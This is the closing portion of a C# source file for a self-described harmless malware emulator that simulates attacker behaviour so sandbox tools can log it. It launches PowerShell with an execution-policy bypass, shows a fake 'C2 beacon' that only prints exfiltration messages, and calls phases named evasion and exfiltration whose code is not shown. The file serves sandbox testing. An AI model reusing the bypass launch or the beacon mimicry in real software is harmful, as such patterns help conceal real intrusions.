                    "Write-Host '  ╚══════════════════════════════════════════╝' -ForegroundColor Red\r\n" +
                    "Write-Host ''\r\n" +
                    "Write-Host '[*] Gathering system intelligence...' -ForegroundColor Yellow\r\n" +
                    "Write-Host ''\r\n" +
                    "Write-Host '--- Running Processes ---' -ForegroundColor Cyan\r\n" +
                    "Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 Name,Id,CPU | Format-Table -AutoSize\r\n" +
                    "Write-Host '--- Network Connections ---' -ForegroundColor Cyan\r\n" +
                    "Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object -First 10 LocalAddress,LocalPort,RemoteAddress,RemotePort | Format-Table -AutoSize\r\n" +
                    "Write-Host ''\r\n" +
                    "Write-Host '[*] Exfiltrating data to C2 server...' -ForegroundColor Red\r\n" +
                    "Write-Host '[*] Uploading credentials...' -ForegroundColor Red\r\n" +
                    "Write-Host '[*] Encoding payload chunks...' -ForegroundColor Red\r\n" +
                    "Write-Host ''\r\n" +
                    "Write-Host '[*] Awaiting next command from C2...' -ForegroundColor Yellow\r\n" +
                    "Write-Host ''\r\n");
                Process.Start(new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-NoProfile -NoExit -ExecutionPolicy Bypass -File \"" + psPath + "\"",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Normal,
                });
                Record("gui", "open_powershell_c2",
                    "Opened PowerShell C2 beacon display");
            }
            catch (Exception e) { Record("gui", "open_powershell_c2", e.Message, false); }

            // Let all windows render fully before continuing
            Thread.Sleep(3000);
            Record("gui", "windows_visible",
                "GUI windows are now visible for screenshot capture");
        }

        // ═══════════════════════════════════════════════════════════
        // MAIN
        // ═══════════════════════════════════════════════════════════

        static int Main(string[] args)
        {
            Directory.CreateDirectory(WorkDir);
            logWriter = new StreamWriter(LogFile, false, Encoding.UTF8);

            Log("╔══════════════════════════════════════════════════════╗");
            Log("║   IsoLens Malware Emulator — Academic Use Only      ║");
            Log("║   This program is HARMLESS. It simulates behaviors  ║");
            Log("║   so sandbox monitoring tools can capture events.   ║");
            Log("╚══════════════════════════════════════════════════════╝");
            Log(string.Format("PID: {0} | User: {1} | Host: {2}",
                Process.GetCurrentProcess().Id,
                Environment.UserName,
                Environment.MachineName));
            Log("Work dir: " + WorkDir);
            Log("Log file: " + LogFile);
            Log("");

            Stopwatch sw = Stopwatch.StartNew();

            PhaseGUIActivity();
            PhaseFileSystem();
            PhaseRegistry();
            PhaseNetwork();
            PhaseProcesses();
            PhaseEvasion();
            PhaseExfiltration();

            sw.Stop();

            Log("");
            Log(string.Format("═══ ALL PHASES COMPLETED in {0:F1} seconds ═══", sw.Elapsed.TotalSeconds));
            Log("JSON results -> " + JsonFile);
            Log("Text log     -> " + LogFile);

            // Write JSON results
            StringBuilder json = new StringBuilder();
            json.AppendLine("[");
            for (int i = 0; i < jsonEntries.Count; i++)
            {
                json.Append(jsonEntries[i]);
                if (i < jsonEntries.Count - 1) json.Append(",");
                json.AppendLine();
            }
            json.AppendLine("]");
            File.WriteAllText(JsonFile, json.ToString(), Encoding.UTF8);

            Log("");
            Log("Press Enter to exit...");
            logWriter.Close();

            // Keep window open if double-clicked
            if (args.Length == 0)
            {
                try { Console.ReadLine(); } catch { }
            }

            return 0;
        }
    }
}
